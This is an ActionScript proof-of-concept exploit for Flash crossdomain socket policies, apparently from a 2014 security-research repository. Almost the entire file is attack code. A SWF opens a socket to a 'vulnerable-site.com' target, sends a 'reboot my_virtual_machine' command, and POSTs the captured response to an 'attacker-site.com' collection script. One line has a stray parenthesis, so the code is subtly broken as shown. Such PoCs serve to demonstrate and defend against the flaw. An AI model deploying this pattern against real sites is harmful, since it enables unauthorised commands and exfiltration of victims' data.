/*
 * Flash socket crossdomain exploit proof-of-concept
 * https://github.com/nnam/flash-socket-crossdomain-exploit
 *
 * Copyright 2014, Nicholas Nam
 * MIT Licensed
 *
 * Thanks to Gursev Singh Kalra for the original Flash crossdomain PoC.
 */


package {
	import flash.display.Sprite;
	import flash.events.*;
	import flash.net.URLRequestMethod;
	import flash.net.URLRequest;
	import flash.net.URLLoader;
	import flash.net.Socket;

	public class SocketCrossDomain extends Sprite {
		public function SocketCrossDomain() {
			// hostname or IP address of the vulnerable site
			var targetName:String = "vulnerable-site.com";
			// socket port number
			var targetPort:uint = 80;
			var socket:Socket = new Socket();
			socket.addEventListener(Event.CONNECT, connectHandler);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, dataHandler);
			socket.connect(targetName, targetPort);
		}

		private function connectHandler(event:Event):void {
			// data/request to send to vulnerable site
			var data:String = "reboot my_virtual_machine\n");
			event.target.writeUTFBytes(data);
			event.target.flush();
		}

		private function dataHandler(event:ProgressEvent):void {
			// URL to which response data (from vulnerable-site.com) is to be sent
			var sendTo:String = "http://attacker-site.com/response-capture.php"
			var sendRequest:URLRequest = new URLRequest(sendTo);
			sendRequest.method = URLRequestMethod.POST;
			sendRequest.data = event.target.readUTFBytes(event.target.bytesAvailable);
			var sendLoader:URLLoader = new URLLoader();
			sendLoader.load(sendRequest);
		}
	}
}
